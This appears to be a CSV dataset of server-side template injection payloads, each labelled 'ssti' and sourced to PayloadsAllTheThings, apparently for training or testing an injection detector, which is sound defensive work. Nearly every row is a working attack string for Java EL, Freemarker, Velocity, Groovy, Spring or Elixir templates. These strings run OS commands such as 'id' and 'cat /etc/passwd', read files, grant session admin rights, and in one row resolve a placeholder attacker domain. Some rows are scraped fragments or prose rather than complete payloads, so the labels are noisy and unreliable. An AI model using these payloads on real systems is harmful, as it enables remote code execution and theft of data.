payload,label,source
@(1+2),ssti,payloads_all_the_things
@{,ssti,payloads_all_the_things
// C# code,ssti,payloads_all_the_things
-in-ASP.NET-Razor/),ssti,payloads_all_the_things
<%= %>,ssti,payloads_all_the_things
"elem(System.shell(""id""), 0) # Rendered RCE",ssti,payloads_all_the_things
"[1, 2][elem(System.shell(""id""), 0)] # Error-Based RCE",ssti,payloads_all_the_things
"1/((elem(System.shell(""id""), 1) == 0)&&1||0) # Boolean-Based RCE",ssti,payloads_all_the_things
"elem(System.shell(""id && sleep 5""), 0) # Time-Based RCE",ssti,payloads_all_the_things
<%= 7 * 7 %>,ssti,payloads_all_the_things
"<%= File.read!(""/etc/passwd"") %>",ssti,payloads_all_the_things
"<%= elem(System.shell(""id""), 0) %> # Rendered RCE",ssti,payloads_all_the_things
"<%= [1, 2][elem(System.shell(""id""), 0)] %> # Error-Based RCE",ssti,payloads_all_the_things
"<%= 1/((elem(System.shell(""id""), 1) == 0)&&1||0) %> # Boolean-Based RCE",ssti,payloads_all_the_things
"<%= elem(System.shell(""id && sleep 5""), 0) %> # Time-Based RCE",ssti,payloads_all_the_things
#{ },ssti,payloads_all_the_things
${ },ssti,payloads_all_the_things
[= ],ssti,payloads_all_the_things
{{ }},ssti,payloads_all_the_things
*{ },ssti,payloads_all_the_things
[[ ]],ssti,payloads_all_the_things
"#set($X="""") $X",ssti,payloads_all_the_things
${...},ssti,payloads_all_the_things
#{...},ssti,payloads_all_the_things
*{...},ssti,payloads_all_the_things
@{...},ssti,payloads_all_the_things
~{...},ssti,payloads_all_the_things
${7*7},ssti,payloads_all_the_things
${{7*7}},ssti,payloads_all_the_things
${class.getClassLoader()},ssti,payloads_all_the_things
"${class.getResource("""").getPath()}",ssti,payloads_all_the_things
"${class.getResource(""../../../../../index.htm"").getContent()}",ssti,payloads_all_the_things
${''.getClass().forName('java.lang.String').getConstructor(''.getClass().forName('[B')).newInstance(''.getClass().forName('java.lang.Runtime').getRuntime().exec('id').inputStream.readAllBytes())} // Rendered RCE,ssti,payloads_all_the_things
${''.getClass().forName('java.lang.Integer').valueOf('x'+''.getClass().forName('java.lang.String').getConstructor(''.getClass().forName('[B')).newInstance(''.getClass().forName('java.lang.Runtime').getRuntime().exec('id').inputStream.readAllBytes()))} // Error-Based RCE,ssti,payloads_all_the_things
${1/((''.getClass().forName('java.lang.Runtime').getRuntime().exec('id').waitFor()==0)?1:0)+''} // Boolean-Based RCE,ssti,payloads_all_the_things
${(''.getClass().forName('java.lang.Runtime').getRuntime().exec('id').waitFor().equals(0)?(''.getClass().forName('java.lang.Thread')).sleep(5000):0).toString()} // Time-Based RCE,ssti,payloads_all_the_things
${3*3},ssti,payloads_all_the_things
Default: `${3*3}`,ssti,payloads_all_the_things
#{3*3},ssti,payloads_all_the_things
Legacy: `#{3*3}`,ssti,payloads_all_the_things
[=3*3],ssti,payloads_all_the_things
Alternative: `[=3*3]` since,ssti,payloads_all_the_things
"${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('path_to_the_file').toURL().openStream().readAllBytes()?join("" "")}",ssti,payloads_all_the_things
Convert the returned bytes to ASCII,ssti,payloads_all_the_things
"<#assign ex = ""freemarker.template.utility.Execute""?new()>${ ex(""id"")}",ssti,payloads_all_the_things
[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')},ssti,payloads_all_the_things
"${""freemarker.template.utility.Execute""?new()(""id"")}",ssti,payloads_all_the_things
"#{""freemarker.template.utility.Execute""?new()(""id"")}",ssti,payloads_all_the_things
"[=""freemarker.template.utility.Execute""?new()(""id"")]",ssti,payloads_all_the_things
"${(""xx""+(""freemarker.template.utility.Execute""?new()(""id"")))?new()} // Error-Based RCE",ssti,payloads_all_the_things
"${1/((freemarker.template.utility.Execute""?new()("" … && echo UniqueString"")?chop_linebreak?ends_with(""UniqueString""))?string('1','0')?eval)} // Boolean-Based RCE",ssti,payloads_all_the_things
"${""freemarker.template.utility.Execute""?new()(""id && sleep 5"")} // Time-Based RCE",ssti,payloads_all_the_things
${9?lower_abc+4?lower_abc)},ssti,payloads_all_the_things
${(6?lower_abc+18?lower_abc+5?lower_abc+5?lower_abc+13?lower_abc+1?lower_abc+18?lower_abc+11?lower_abc+5?lower_abc+18?lower_abc+1.1?c[1]+20?lower_abc+5?lower_abc+13?lower_abc+16?lower_abc+12?lower_abc+1?lower_abc+20?lower_abc+5?lower_abc+1.1?c[1]+21?lower_abc+20?lower_abc+9?lower_abc+12?lower_abc+9?lower_abc+20?lower_abc+25?lower_abc+1.1?c[1]+5?upper_abc+24?lower_abc+5?lower_abc+3?lower_abc+21?lower_abc+20?lower_abc+5?lower_abc)?new()(9?lower_abc+4?lower_abc)},ssti,payloads_all_the_things
<#assign classloader=article.class.protectionDomain.classLoader>,ssti,payloads_all_the_things
"<#assign owc=classloader.loadClass(""freemarker.template.ObjectWrapper"")>",ssti,payloads_all_the_things
"<#assign dwf=owc.getField(""DEFAULT_WRAPPER"").get(null)>",ssti,payloads_all_the_things
"<#assign ec=classloader.loadClass(""freemarker.template.utility.Execute"")>",ssti,payloads_all_the_things
"${dwf.newInstance(ec,null)(""id"")}",ssti,payloads_all_the_things
{{'a'.toUpperCase()}} would result in 'A',ssti,payloads_all_the_things
{{ request }} would return a request object like com.[...].context.TemplateContextRequest@23548206,ssti,payloads_all_the_things
"{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\""new java.lang.String('xxx')\"")}}",ssti,payloads_all_the_things
"{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\""var x=new java.lang.ProcessBuilder; x.command(\\\""whoami\\\""); x.start()\"")}}",ssti,payloads_all_the_things
"{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\""var x=new java.lang.ProcessBuilder; x.command(\\\""netstat\\\""); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\"")}}",ssti,payloads_all_the_things
"{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\""var x=new java.lang.ProcessBuilder; x.command(\\\""uname\\\"",\\\""-a\\\""); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\"")}}",ssti,payloads_all_the_things
{{ someString.toUPPERCASE() }},ssti,payloads_all_the_things
{{ variable.getClass().forName('java.lang.Runtime').getRuntime().exec('ls -la') }},ssti,payloads_all_the_things
{% set cmd = 'id' %},ssti,payloads_all_the_things
{% set bytes = (1).TYPE,ssti,payloads_all_the_things
.forName('java.lang.Runtime'),ssti,payloads_all_the_things
.methods[6],ssti,payloads_all_the_things
".invoke(null,null)",ssti,payloads_all_the_things
.exec(cmd),ssti,payloads_all_the_things
.inputStream,ssti,payloads_all_the_things
.readAllBytes() %},ssti,payloads_all_the_things
{{ (1).TYPE,ssti,payloads_all_the_things
.forName('java.lang.String'),ssti,payloads_all_the_things
.constructors[0],ssti,payloads_all_the_things
.newInstance(([bytes]).toArray()) }},ssti,payloads_all_the_things
"#set($str=$class.inspect(""java.lang.String"").type)",ssti,payloads_all_the_things
"#set($chr=$class.inspect(""java.lang.Character"").type)",ssti,payloads_all_the_things
"#set($ex=$class.inspect(""java.lang.Runtime"").type.getRuntime().exec(""whoami""))",ssti,payloads_all_the_things
$ex.waitFor(),ssti,payloads_all_the_things
#set($out=$ex.getInputStream()),ssti,payloads_all_the_things
#foreach($i in [1..$out.available()]),ssti,payloads_all_the_things
$str.valueOf($chr.toChars($out.read())),ssti,payloads_all_the_things
#end,ssti,payloads_all_the_things
"echo ""a"" > /tmp/a",ssti,payloads_all_the_things
#set($base64EncodedCommand = 'd2hvYW1p'),ssti,payloads_all_the_things
#set($contextObjectClass = $knownContextObject.getClass()),ssti,payloads_all_the_things
"#set($Base64Class = $contextObjectClass.forName(""java.util.Base64""))",ssti,payloads_all_the_things
"#set($Base64Decoder = $Base64Class.getMethod(""getDecoder"").invoke(null))",ssti,payloads_all_the_things
#set($decodedBytes = $Base64Decoder.decode($base64EncodedCommand)),ssti,payloads_all_the_things
"#set($StringClass = $contextObjectClass.forName(""java.lang.String""))",ssti,payloads_all_the_things
"#set($command = $StringClass.getConstructor($contextObjectClass.forName(""[B""), $contextObjectClass.forName(""java.lang.String"")).newInstance($decodedBytes, ""UTF-8""))",ssti,payloads_all_the_things
"#set($commandArgs = [""/bin/sh"", ""-c"", $command])",ssti,payloads_all_the_things
"#set($ProcessBuilderClass = $contextObjectClass.forName(""java.lang.ProcessBuilder""))",ssti,payloads_all_the_things
"#set($processBuilder = $ProcessBuilderClass.getConstructor($contextObjectClass.forName(""java.util.List"")).newInstance($commandArgs))",ssti,payloads_all_the_things
#set($processBuilder = $processBuilder.redirectErrorStream(true)),ssti,payloads_all_the_things
#set($process = $processBuilder.start()),ssti,payloads_all_the_things
#set($exitCode = $process.waitFor()),ssti,payloads_all_the_things
#set($inputStream = $process.getInputStream()),ssti,payloads_all_the_things
"#set($ScannerClass = $contextObjectClass.forName(""java.util.Scanner""))",ssti,payloads_all_the_things
"#set($scanner = $ScannerClass.getConstructor($contextObjectClass.forName(""java.io.InputStream"")).newInstance($inputStream))",ssti,payloads_all_the_things
"#set($scannerDelimiter = $scanner.useDelimiter(""\\A""))",ssti,payloads_all_the_things
#if($scanner.hasNext()),ssti,payloads_all_the_things
#set($output = $scanner.next().trim()),ssti,payloads_all_the_things
"$output.replaceAll(""\\s+$"", """").replaceAll(""^\\s+"", """")",ssti,payloads_all_the_things
"#set($s="""")",ssti,payloads_all_the_things
"#set($sc=$s.getClass().getConstructor($s.getClass().forName(""[B""), $s.getClass()))",ssti,payloads_all_the_things
"#set($p=$s.getClass().forName(""java.lang.Runtime"").getRuntime().exec(""id"")",ssti,payloads_all_the_things
#set($n=$p.waitFor()),ssti,payloads_all_the_things
"#set($b=""Y:/A:/""+$sc.newInstance($p.inputStream.readAllBytes(), ""UTF-8""))",ssti,payloads_all_the_things
#include($b),ssti,payloads_all_the_things
"#set($p=$s.getClass().forName(""java.lang.Runtime"").getRuntime().exec(""id""))",ssti,payloads_all_the_things
#set($r=$p.exitValue()),ssti,payloads_all_the_things
#if($r != 0),ssti,payloads_all_the_things
"#include(""Y:/A:/xxx"")",ssti,payloads_all_the_things
"#set($t=$s.getClass().forName(""java.lang.Thread"").sleep(5000))",ssti,payloads_all_the_things
${9*9},ssti,payloads_all_the_things
${String x = new File('c:/windows/notepad.exe').text},ssti,payloads_all_the_things
${String x = new File('/path/to/file').getText('UTF-8')},ssti,payloads_all_the_things
"${new File(""C:\Temp\FileName.txt"").createNewFile();}",ssti,payloads_all_the_things
"${""http://www.google.com"".toURL().text}",ssti,payloads_all_the_things
"${new URL(""http://www.google.com"").getText()}",ssti,payloads_all_the_things
"${""calc.exe"".exec()}",ssti,payloads_all_the_things
"${""calc.exe"".execute()}",ssti,payloads_all_the_things
"${this.evaluate(""9*9"") //(this is a Script class)}",ssti,payloads_all_the_things
"${new org.codehaus.groovy.runtime.MethodClosure(""calc.exe"",""execute"").call()}",ssti,payloads_all_the_things
${((char)105).toString()+((char)100).toString()},ssti,payloads_all_the_things
"${x=new/**/String();for(i/**/in[105,100]){x+=((char)i).toString()};x.execute().text}${x=new/**/String();for(i/**/in[105,100]){x+=((char)i).toString()};x.execute().text}",ssti,payloads_all_the_things
"${ @ASTTest(value={assert java.lang.Runtime.getRuntime().exec(""whoami"")})",ssti,payloads_all_the_things
def x },ssti,payloads_all_the_things
"${ new groovy.lang.GroovyClassLoader().parseClass(""@groovy.transform.ASTTest(value={assert java.lang.Runtime.getRuntime().exec(\""calc.exe\"")})def x"") }",ssti,payloads_all_the_things
"${'patt'.toString().replace('a', 'x')}",ssti,payloads_all_the_things
${T(java.lang.Integer).valueOf('1')},ssti,payloads_all_the_things
${T(java.lang.System).getenv()},ssti,payloads_all_the_things
${T(java.lang.Runtime).getRuntime().exec('cat /etc/passwd')},ssti,payloads_all_the_things
${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())},ssti,payloads_all_the_things
"${"""".getClass().forName(""java.net.InetAddress"").getMethod(""getByName"","""".getClass()).invoke("""",""[ATTACKER.DOMAIN.TLD]"")}",ssti,payloads_all_the_things
"${pageContext.request.getSession().setAttribute(""admin"",true)}",ssti,payloads_all_the_things
Method using `java.lang.Runtime` #1 - accessed with JavaClass,ssti,payloads_all_the_things
"${T(java.lang.Runtime).getRuntime().exec(""whoami"")}",ssti,payloads_all_the_things
Method using `java.lang.Runtime` #2,ssti,payloads_all_the_things
"#{session.setAttribute(""rtc"","""".getClass().forName(""java.lang.Runtime"").getDeclaredConstructors()[0])}",ssti,payloads_all_the_things
"#{session.getAttribute(""rtc"").setAccessible(true)}",ssti,payloads_all_the_things
"#{session.getAttribute(""rtc"").getRuntime().exec(""/bin/bash -c whoami"")}",ssti,payloads_all_the_things
Method using `java.lang.Runtime` #3 - accessed with `invoke`,ssti,payloads_all_the_things
${''.getClass().forName('java.lang.Runtime').getMethods()[6].invoke(''.getClass().forName('java.lang.Runtime')).exec('whoami')},ssti,payloads_all_the_things
javax.script.ScriptEngineManager,ssti,payloads_all_the_things
